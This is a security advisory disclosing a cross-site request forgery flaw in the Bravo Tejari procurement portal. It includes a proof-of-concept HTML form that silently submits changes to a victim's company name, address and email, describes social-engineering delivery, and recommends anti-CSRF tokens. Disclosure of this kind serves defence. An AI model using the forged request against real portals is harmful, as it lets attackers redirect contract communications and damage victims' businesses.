Affected Product Code Base: Bravo Solution

Impact: Unauthorised Access

Product description:
Bravo Tejari is a strategic procurement platform that enables organizations
to generate more value, influence innovation and reduce risk powered by a
unique supplier-centered approach that integrates supplier lifetime value
throughout the entire procurement process

Attack Scenario:
The Web Interface of the Bravo Tejari procurement portal does not use
random tokens to block any kind of forged requests. An atacker can take
advantage of this scenario and create a forged request to edit user account
details like name, address of the company/individual, email address etc. He
then uses social engineering techniques to target specific individuals
whose account details he would like to change. He simply sends the link and
tricks the user into clicking the forged http request. The request is
executed and user account details are changed without his knowledge.

Proof of Concept Code:
Forged HTTP Request used by the attacker:

<html>
    <body>
    <form action="https://XXXX.XXXX.com/esop/toolkit/profile/regData.do"
method="POST">
      <input type="hidden" name="userAct" value="confirmData" />
      <input type="hidden" name="from" value="registration&#95;data" />
      <input type="hidden" name="actionNumber" value="0" />
      <input type="hidden" name="companyExtStatusCode" value="31" />
      <input type="hidden" name="companyExtStatusNote" value="" />
      <input type="hidden" name="hideCompany" value="false" />
      <input type="hidden" name="companyName"
value="XYZ&#32;COMPUTER&#32;SYSTEMS&#32;FZ&#32;LLC" />
      <input type="hidden" name="companyAddress"
value="Dubai&#32;internet&#32;city&#44;&#32;DUBAI" />
      <input type="hidden" name="companyCity" value="DUBAI" />
      <input type="hidden" name="companyCountry" value="AE" />
      <input type="hidden" name="companyProvince" value="Dubai" />
      <input type="hidden" name="companyZip" value="25703" />
      <input type="hidden" name="companyPhone" value="43918600" />
      <input type="hidden" name="companyFax" value="" />
      <input type="hidden" name="companyEmail"
value="XYZ&#46;v&#64;XYZ&#46;com" />
      <input type="hidden" name="companyWebSite" value="" />
      <input type="hidden" name="companyLegalStructure" value="" />
      <input type="hidden" name="companyAddress2" value="" />
      <input type="hidden" name="companyFiscalCode" value="215703" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


Impact:
The affected product is a procurement portal and so all communication
regarding the contract lifecycle process is sent to user details provided
on the portal. If this vulnerability is sucessfully exploited, the attacker
will be able to change these details which will potentially affect the
victim's business.

Recommendation:
Ensure that all sensitive CRUD Operations are appropriately protected with
random tokens. Alternatively, the sensitive operations should also have an
authentication layer to confirm user verification.
